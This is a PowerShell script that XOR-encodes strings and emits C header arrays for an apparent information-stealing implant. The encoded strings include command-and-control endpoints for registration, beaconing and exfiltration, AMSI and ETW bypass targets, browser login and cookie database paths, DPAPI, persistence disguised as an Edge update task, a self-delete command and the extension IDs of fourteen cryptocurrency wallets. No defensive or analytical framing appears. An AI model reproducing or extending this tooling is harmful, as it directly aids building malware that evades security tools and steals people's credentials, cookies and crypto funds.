$base_key = 0x5A
$keys = @($base_key, ($base_key -bxor 0x37), ($base_key -bxor 0x91), ($base_key -bxor 0xC5))
# keys = 0x5A, 0x6D, 0xCB, 0x9F

function XorEncode($name, $str) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
    $enc = for ($i = 0; $i -lt $bytes.Length; $i++) {
        "0x{0:x2}" -f ($bytes[$i] -bxor $keys[$i % 4])
    }
    $hexStr = $enc -join ","
    Write-Output "/* `"$str`" */"
    Write-Output "static const BYTE ENC_${name}[] = {$hexStr};"
    Write-Output "#define DEC_${name}(buf) _xd(buf, ENC_${name}, $($bytes.Length), 0x5A)"
    Write-Output ""
}

Write-Output "Keys: $($keys | ForEach-Object { '0x{0:x2}' -f $_ })"
Write-Output ""

# C2 paths
XorEncode "C2_REGISTER" "/api/v1/register"
XorEncode "C2_BEACON" "/api/v1/beacon"
XorEncode "C2_EXFIL" "/api/v1/exfil"
XorEncode "C2_RESULT" "/api/v1/result"
XorEncode "USER_AGENT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
XorEncode "CONTENT_TYPE" "Content-Type: application/json"
XorEncode "NTDLL" "ntdll.dll"
XorEncode "KERNEL32" "kernel32.dll"
XorEncode "AMSI_DLL" "amsi.dll"
XorEncode "AMSI_SCAN" "AmsiScanBuffer"
XorEncode "ETW_WRITE" "EtwEventWrite"
XorEncode "CHROME_LOCAL_STATE" "\Google\Chrome\User Data\Local State"
XorEncode "CHROME_LOGIN" "\Google\Chrome\User Data\Default\Login Data"
XorEncode "EDGE_LOCAL" "\Microsoft\Edge\User Data\Local State"
XorEncode "SCHTASK_NAME" "\Microsoft\Windows\EdgeUpdate\EdgeAutoUpdate"
XorEncode "PERSIST_DIR" "\Microsoft\EdgeUpdate\Current"
XorEncode "PERSIST_EXE" "msedge_update.exe"
XorEncode "CMD_PING_DEL" "/c ping 127.0.0.1 -n 3 > nul & del /f /q"
XorEncode "PIPE_NAME" "\\.\\pipe\\msedge_crashpad_handler"
XorEncode "ENCRYPTED_KEY" "encrypted_key"
XorEncode "SQLITE_MAGIC" "SQLite format 3"

# Browser paths
XorEncode "BR_CHROME" "Google\Chrome\User Data"
XorEncode "BR_EDGE" "Microsoft\Edge\User Data"
XorEncode "BR_BRAVE" "BraveSoftware\Brave-Browser\User Data"
XorEncode "BR_OPERA" "Opera Software\Opera Stable"
XorEncode "BR_VIVALDI" "Vivaldi\User Data"
XorEncode "LOCAL_STATE" "Local State"
XorEncode "LOGIN_DATA" "Login Data"
XorEncode "COOKIES" "Cookies"
XorEncode "DEFAULT" "Default"
XorEncode "DPAPI" "DPAPI"

# DLL names
XorEncode "WINHTTP_DLL" "winhttp.dll"
XorEncode "CRYPT32_DLL" "crypt32.dll"
XorEncode "BCRYPT_DLL" "bcrypt.dll"

# Wallets
XorEncode "WALLET_METAMASK" "nkbihfbeogaeaoehlefnkodbefgpgknn"
XorEncode "WALLET_PHANTOM" "bfnaelmomeimhlpmgjnjophhpkkoljpa"
XorEncode "WALLET_COINBASE" "hnfanknocfeofbddgcijnmhnfnkdnaad"
XorEncode "WALLET_TRUST" "egjidjbpglichdcondbcbdnbeeppgdph"
XorEncode "WALLET_BINANCE" "fhbohimaelbohpjbbldcngcnapndodjp"
XorEncode "WALLET_RABBY" "acmacodkjbdgmoleebolmdjonilkdbch"
XorEncode "WALLET_OKX" "mcohilncbfahbmgdjkbpemcciiolgcge"
XorEncode "WALLET_SOLFLARE" "bhhhlbepdkbapadjdcodbhiefbnbdidos"
XorEncode "WALLET_KEPLR" "dmkamcknogkgcdfhhbddcghachkejeap"
XorEncode "WALLET_RONIN" "fnjhmkhhmkbjkkabndcnnogagogbneec"
XorEncode "WALLET_EXODUS" "aholpfdialjgjfhomihkjbmgjidlcdno"
XorEncode "WALLET_BRAVE" "odbfpeeihdkbihmopkbjmoonfanlbfcl"
XorEncode "WALLET_TRONLINK" "ibnejdfjmmkpcnlpebklmnkoeoihofec"
XorEncode "WALLET_ZERION" "klghhnkeealcohjjanjjdaeeggmfmlpl"

# Other stealer
XorEncode "LOCAL_EXT_SET" "Local Extension Settings"
XorEncode "NETWORK_COOKIES" "Network\Cookies"
XorEncode "PROF_1" "Profile 1"
XorEncode "PROF_2" "Profile 2"
XorEncode "PROF_3" "Profile 3"
XorEncode "PROF_4" "Profile 4"
XorEncode "PROF_5" "Profile 5"
